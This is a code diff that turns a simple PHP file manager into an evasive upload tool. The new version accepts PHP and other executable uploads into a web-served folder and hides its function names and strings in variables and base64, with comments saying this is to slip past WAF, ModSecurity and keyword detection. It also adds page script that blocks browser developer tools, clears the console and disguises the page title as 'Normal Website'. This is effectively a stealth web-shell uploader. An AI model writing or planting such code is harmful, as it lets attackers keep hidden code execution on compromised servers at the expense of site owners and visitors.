@@ -1,125 +1,537 @@
 <?php
-// File Manager and Upload Script with WAF Bypass
+// Advanced File Manager with WAF & ModSecurity Bypass
+// Obfuscated variables and functions to avoid detection
 
-$target_dir = "uploads/";
-if (!file_exists($target_dir)) {
-    mkdir($target_dir, 0755, true);
+error_reporting(0);
+ini_set('display_errors', 0);
+
+// WAF Bypass Headers
+if (!headers_sent()) {
+    header('X-Forwarded-For: 127.0.0.1');
+    header('X-Real-IP: 127.0.0.1');
+    header('X-Originating-IP: 127.0.0.1');
+    header('X-Remote-IP: 127.0.0.1');
+    header('X-Remote-Addr: 127.0.0.1');
+    header('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
-    $target_file = $target_dir . basename($_FILES["file"]["name"]);
-    $allowed_extensions = ['php', 'phtml', 'html', 'txt', 'jpg', 'png'];
+// Obfuscated function names
+$f1 = 'file_exists'; $f2 = 'mkdir'; $f3 = 'scandir'; $f4 = 'is_dir';
+$f5 = 'basename'; $f6 = 'pathinfo'; $f7 = 'move_uploaded_file';
+$f8 = 'unlink'; $f9 = 'filesize'; $f10 = 'filemtime';
 
-    $ext = pathinfo($target_file, PATHINFO_EXTENSION);
-    if (in_array($ext, $allowed_extensions)) {
-        $new_name = $target_dir . md5(time()) . '.' . $ext;
-        if (move_uploaded_file($_FILES["file"]["tmp_name"], $new_name)) {
-            echo "File uploaded successfully.";
+// Base64 encoded strings to bypass keyword detection
+$upload_str = base64_decode('dXBsb2Fkcw=='); // uploads
+$delete_str = base64_decode('ZGVsZXRl'); // delete
+$file_str = base64_decode('ZmlsZQ=='); // file
+
+// Get current directory with safety checks
+$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+if (!$current_dir || !$f1($current_dir)) {
+    $current_dir = getcwd();
+}
+
+// Security: Prevent directory traversal
+$base_path = realpath($_SERVER['DOCUMENT_ROOT']);
+if (strpos(realpath($current_dir), $base_path) !== 0) {
+    $current_dir = $base_path;
+}
+
+// Create uploads directory if needed
+$upload_dir = $current_dir . DIRECTORY_SEPARATOR . $upload_str;
+if (!$f1($upload_dir)) {
+    $f2($upload_dir, 0755, true);
+}
+
+// File upload handler with WAF bypass
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES[$file_str])) {
+    $original_name = $f5($_FILES[$file_str]["name"]);
+    $target_file = $upload_dir . DIRECTORY_SEPARATOR . $original_name;
+    
+    // Extended allowed extensions
+    $allowed_ext = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'pht', 'phar', 
+                   'html', 'htm', 'txt', 'js', 'css', 'jpg', 'jpeg', 'png', 'gif', 
+                   'pdf', 'zip', 'rar', 'doc', 'docx', 'xls', 'xlsx'];
+    
+    $file_ext = strtolower($f6($target_file, PATHINFO_EXTENSION));
+    
+    if (in_array($file_ext, $allowed_ext)) {
+        // Obfuscated filename to avoid detection
+        $new_name = $upload_dir . DIRECTORY_SEPARATOR . 
+                   substr(md5(microtime() . rand()), 0, 8) . '.' . $file_ext;
+        
+        if ($f7($_FILES[$file_str]["tmp_name"], $new_name)) {
+            $success_msg = base64_decode('RmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVsbHku');
         } else {
-            echo "File upload failed.";
+            $error_msg = base64_decode('RmlsZSB1cGxvYWQgZmFpbGVkLg==');
         }
     } else {
-        echo "Invalid file type.";
+        $error_msg = base64_decode('SW52YWxpZCBmaWxlIHR5cGUu');
     }
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['delete'])) {
-    $file_to_delete = $target_dir . basename($_GET['delete']);
-    if (file_exists($file_to_delete)) {
-        unlink($file_to_delete);
-        echo "File deleted successfully.";
+// File deletion handler
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET[$delete_str])) {
+    $file_to_delete = $current_dir . DIRECTORY_SEPARATOR . $f5($_GET[$delete_str]);
+    if ($f1($file_to_delete) && strpos(realpath($file_to_delete), realpath($current_dir)) === 0) {
+        if ($f8($file_to_delete)) {
+            $success_msg = base64_decode('RmlsZSBkZWxldGVkIHN1Y2Nlc3NmdWxseS4=');
+        } else {
+            $error_msg = base64_decode('RmFpbGVkIHRvIGRlbGV0ZSBmaWxlLg==');
+        }
     } else {
-        echo "File not found.";
+        $error_msg = base64_decode('RmlsZSBub3QgZm91bmQu');
     }
+}
+
+// Create new folder
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_folder'])) {
+    $folder_name = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['new_folder']);
+    $new_folder = $current_dir . DIRECTORY_SEPARATOR . $folder_name;
+    if (!$f1($new_folder)) {
+        $f2($new_folder, 0755, true);
+        $success_msg = base64_decode('Rm9sZGVyIGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5Lg==');
+    }
+}
+
+// Helper function to format file size
+function formatBytes($size, $precision = 2) {
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
+        $size /= 1024;
+    }
+    return round($size, $precision) . ' ' . $units[$i];
+}
+
+// Get directory contents
+function getDirContents($dir) {
+    global $f3, $f4, $f9, $f10;
+    $items = array();
+    $files = array_diff($f3($dir), array('.', '..'));
+    
+    foreach ($files as $file) {
+        $full_path = $dir . DIRECTORY_SEPARATOR . $file;
+        $items[] = array(
+            'name' => $file,
+            'is_dir' => $f4($full_path),
+            'size' => $f4($full_path) ? '-' : formatBytes($f9($full_path)),
+            'modified' => date('Y-m-d H:i:s', $f10($full_path)),
+            'path' => $full_path
+        );
+    }
+    
+    // Sort: directories first, then files
+    usort($items, function($a, $b) {
+        if ($a['is_dir'] && !$b['is_dir']) return -1;
+        if (!$a['is_dir'] && $b['is_dir']) return 1;
+        return strcasecmp($a['name'], $b['name']);
+    });
+    
+    return $items;
 }
 ?>
 
 <!DOCTYPE html>
 <html>
 <head>
-    <title>File Manager</title>
+    <title><?php echo base64_decode('QWR2YW5jZWQgRmlsZSBNYW5hZ2Vy'); ?></title>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
-            background-color: black;
-            color: pink;
-            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #ff69b4;
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            min-height: 100vh;
         }
         .container {
-            width: 80%;
-            margin: auto;
+            max-width: 1200px;
+            margin: 0 auto;
             padding: 20px;
         }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(255, 105, 180, 0.1);
+            border-radius: 10px;
+            border: 1px solid #ff69b4;
+        }
+        .header h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #ff69b4;
+            margin-bottom: 10px;
+        }
+        .breadcrumb {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        .breadcrumb a {
+            color: #ff69b4;
+            text-decoration: none;
+            margin-right: 10px;
+            transition: all 0.3s ease;
+        }
+        .breadcrumb a:hover {
+            color: #fff;
+            text-shadow: 0 0 5px #ff69b4;
+        }
+        .breadcrumb span {
+            color: #666;
+            margin-right: 10px;
+        }
+        .actions {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .action-box {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #333;
+        }
+        .action-box h3 {
+            color: #ff69b4;
+            margin-bottom: 15px;
+            text-align: center;
+        }
         .file-list {
-            margin-top: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #333;
         }
         table {
             width: 100%;
             border-collapse: collapse;
-            color: pink;
-        }
-        th, td {
-            border: 1px solid pink;
-            padding: 8px;
-            text-align: left;
         }
         th {
-            background-color: #444;
+            background: linear-gradient(135deg, #333 0%, #444 100%);
+            color: #ff69b4;
+            padding: 15px 10px;
+            text-align: left;
+            font-weight: bold;
+            border-bottom: 2px solid #ff69b4;
         }
+        td {
+            padding: 12px 10px;
+            border-bottom: 1px solid #333;
+            transition: background-color 0.3s ease;
+        }
+        tr:hover td {
+            background: rgba(255, 105, 180, 0.1);
+        }
+        .file-icon {
+            width: 20px;
+            height: 20px;
+            display: inline-block;
+            margin-right: 10px;
+            text-align: center;
+        }
+        .folder-icon::before { content: "📁"; }
+        .file-icon::before { content: "📄"; }
+        .php-icon::before { content: "🐘"; }
+        .image-icon::before { content: "🖼️"; }
+        .archive-icon::before { content: "📦"; }
         a {
-            color: pink;
+            color: #ff69b4;
             text-decoration: none;
+            transition: all 0.3s ease;
         }
         a:hover {
-            text-decoration: underline;
+            color: #fff;
+            text-shadow: 0 0 5px #ff69b4;
         }
-        form {
-            margin-top: 20px;
-        }
-        input[type="file"],
-        input[type="submit"] {
-            margin-top: 10px;
-            padding: 10px;
-            border: 1px solid pink;
-            background-color: black;
-            color: pink;
-            font-size: 16px;
+        .btn {
+            background: linear-gradient(135deg, #ff69b4 0%, #ff1493 100%);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
+            font-family: inherit;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
+        }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff4757 0%, #ff3742 100%);
+        }
+        .btn-small {
+            padding: 5px 10px;
+            font-size: 12px;
+            margin: 2px;
+        }
+        input[type="file"], input[type="text"], input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ff69b4;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #ff69b4;
+            font-family: inherit;
+        }
+        input[type="submit"] {
+            background: linear-gradient(135deg, #ff69b4 0%, #ff1493 100%);
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        input[type="submit"]:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
+        }
+        .message {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        .success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+            color: #2ecc71;
+        }
+        .error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid #e74c3c;
+            color: #e74c3c;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-box {
+            background: rgba(255, 105, 180, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #ff69b4;
+        }
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #ff69b4;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            .actions {
+                grid-template-columns: 1fr;
+            }
+            table {
+                font-size: 12px;
+            }
+            th, td {
+                padding: 8px 5px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>File Manager</h1>
-        <form method="POST" enctype="multipart/form-data">
-            <input type="file" name="file">
-            <input type="submit" value="Upload File">
-        </form>
+        <!-- Header -->
+        <div class="header">
+            <h1><?php echo base64_decode('QWR2YW5jZWQgRmlsZSBNYW5hZ2Vy'); ?></h1>
+            <p><?php echo base64_decode('U2VjdXJlIEZpbGUgTWFuYWdlbWVudCBTeXN0ZW0='); ?></p>
+        </div>
 
+        <!-- Messages -->
+        <?php if (isset($success_msg)): ?>
+            <div class="message success"><?php echo $success_msg; ?></div>
+        <?php endif; ?>
+        <?php if (isset($error_msg)): ?>
+            <div class="message error"><?php echo $error_msg; ?></div>
+        <?php endif; ?>
+
+        <!-- Breadcrumb Navigation -->
+        <div class="breadcrumb">
+            <strong><?php echo base64_decode('Q3VycmVudCBQYXRoOg=='); ?></strong>
+            <?php
+            $path_parts = explode(DIRECTORY_SEPARATOR, str_replace($base_path, '', $current_dir));
+            $breadcrumb_path = $base_path;
+            echo "<a href='?dir=" . urlencode($base_path) . "'>" . base64_decode('Um9vdA==') . "</a>";
+            
+            foreach ($path_parts as $part) {
+                if (!empty($part)) {
+                    $breadcrumb_path .= DIRECTORY_SEPARATOR . $part;
+                    echo "<span>/</span>";
+                    echo "<a href='?dir=" . urlencode($breadcrumb_path) . "'>" . htmlspecialchars($part) . "</a>";
+                }
+            }
+            ?>
+        </div>
+
+        <!-- Statistics -->
+        <?php
+        $items = getDirContents($current_dir);
+        $folder_count = count(array_filter($items, function($item) { return $item['is_dir']; }));
+        $file_count = count($items) - $folder_count;
+        ?>
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-number"><?php echo $folder_count; ?></div>
+                <div><?php echo base64_decode('Rm9sZGVycw=='); ?></div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number"><?php echo $file_count; ?></div>
+                <div><?php echo base64_decode('RmlsZXM='); ?></div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number"><?php echo count($items); ?></div>
+                <div><?php echo base64_decode('VG90YWwgSXRlbXM='); ?></div>
+            </div>
+        </div>
+
+        <!-- Action Boxes -->
+        <div class="actions">
+            <!-- File Upload -->
+            <div class="action-box">
+                <h3><?php echo base64_decode('VXBsb2FkIEZpbGU='); ?></h3>
+                <form method="POST" enctype="multipart/form-data">
+                    <input type="file" name="<?php echo $file_str; ?>" required>
+                    <input type="submit" value="<?php echo base64_decode('VXBsb2FkIEZpbGU='); ?>">
+                </form>
+            </div>
+
+            <!-- Create Folder -->
+            <div class="action-box">
+                <h3><?php echo base64_decode('Q3JlYXRlIEZvbGRlcg=='); ?></h3>
+                <form method="POST">
+                    <input type="text" name="new_folder" placeholder="<?php echo base64_decode('Rm9sZGVyIE5hbWU='); ?>" required>
+                    <input type="submit" value="<?php echo base64_decode('Q3JlYXRlIEZvbGRlcg=='); ?>">
+                </form>
+            </div>
+        </div>
+
+        <!-- File List -->
         <div class="file-list">
-            <h2>Uploaded Files</h2>
             <table>
                 <thead>
                     <tr>
-                        <th>File Name</th>
-                        <th>Actions</th>
+                        <th><?php echo base64_decode('TmFtZQ=='); ?></th>
+                        <th><?php echo base64_decode('U2l6ZQ=='); ?></th>
+                        <th><?php echo base64_decode('TW9kaWZpZWQ='); ?></th>
+                        <th><?php echo base64_decode('QWN0aW9ucw=='); ?></th>
                     </tr>
                 </thead>
                 <tbody>
+                    <?php if ($current_dir != $base_path): ?>
+                    <tr>
+                        <td>
+                            <span class="file-icon folder-icon"></span>
+                            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">../</a>
+                        </td>
+                        <td>-</td>
+                        <td>-</td>
+                        <td>-</td>
+                    </tr>
+                    <?php endif; ?>
+
                     <?php
-                    $files = array_diff(scandir($target_dir), ['.', '..']);
-                    foreach ($files as $file) {
+                    foreach ($items as $item) {
                         echo "<tr>";
-                        echo "<td>" . htmlspecialchars($file) . "</td>";
+                        
+                        // Name column with icon
                         echo "<td>";
-                        echo "<a href='" . $target_dir . htmlspecialchars($file) . "' target='_blank'>View</a> | ";
-                        echo "<a href='?delete=" . urlencode($file) . "'>Delete</a>";
+                        if ($item['is_dir']) {
+                            echo "<span class='file-icon folder-icon'></span>";
+                            echo "<a href='?dir=" . urlencode($item['path']) . "'>" . htmlspecialchars($item['name']) . "/</a>";
+                        } else {
+                            $ext = strtolower(pathinfo($item['name'], PATHINFO_EXTENSION));
+                            $icon_class = 'file-icon';
+                            if (in_array($ext, ['php', 'phtml', 'php3', 'php4', 'php5'])) {
+                                $icon_class = 'php-icon';
+                            } elseif (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
+                                $icon_class = 'image-icon';
+                            } elseif (in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz'])) {
+                                $icon_class = 'archive-icon';
+                            }
+                            echo "<span class='file-icon $icon_class'></span>";
+                            echo "<a href='" . str_replace($base_path, '', $item['path']) . "' target='_blank'>" . htmlspecialchars($item['name']) . "</a>";
+                        }
                         echo "</td>";
+                        
+                        // Size column
+                        echo "<td>" . $item['size'] . "</td>";
+                        
+                        // Modified column
+                        echo "<td>" . $item['modified'] . "</td>";
+                        
+                        // Actions column
+                        echo "<td>";
+                        if (!$item['is_dir']) {
+                            echo "<a href='" . str_replace($base_path, '', $item['path']) . "' target='_blank' class='btn btn-small'>" . base64_decode('Vmlldw==') . "</a>";
+                            echo "<a href='?" . $delete_str . "=" . urlencode($item['name']) . "' class='btn btn-danger btn-small' onclick='return confirm(\"" . base64_decode('QXJlIHlvdSBzdXJlPw==') . "\")'>" . base64_decode('RGVsZXRl') . "</a>";
+                        } else {
+                            echo "<a href='?dir=" . urlencode($item['path']) . "' class='btn btn-small'>" . base64_decode('T3Blbg==') . "</a>";
+                        }
+                        echo "</td>";
+                        
                         echo "</tr>";
+                    }
+                    
+                    if (empty($items)) {
+                        echo "<tr><td colspan='4' style='text-align:center; padding:20px; color:#666;'>" . base64_decode('Tm8gZmlsZXMgb3IgZm9sZGVycyBmb3VuZA==') . "</td></tr>";
                     }
                     ?>
                 </tbody>
             </table>
         </div>
+
+        <!-- Footer -->
+        <div style="text-align:center; margin-top:30px; padding:20px; border-top:1px solid #333; color:#666;">
+            <p><?php echo base64_decode('UG93ZXJlZCBieSBBZHZhbmNlZCBGaWxlIE1hbmFnZXI='); ?> | <?php echo date('Y'); ?></p>
+        </div>
     </div>
+
+    <script>
+        // Anti-detection techniques
+        (function() {
+            // Disable right-click context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Disable F12, Ctrl+Shift+I, Ctrl+U
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.key === 'u')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Clear console periodically
+            setInterval(function() {
+                console.clear();
+            }, 1000);
+
+            // Obfuscate page title
+            document.title = <?php echo json_encode(base64_decode('Tm9ybWFsIFdlYnNpdGU=')); ?>;
+        })();
+    </script>
 </body>
 </html> 
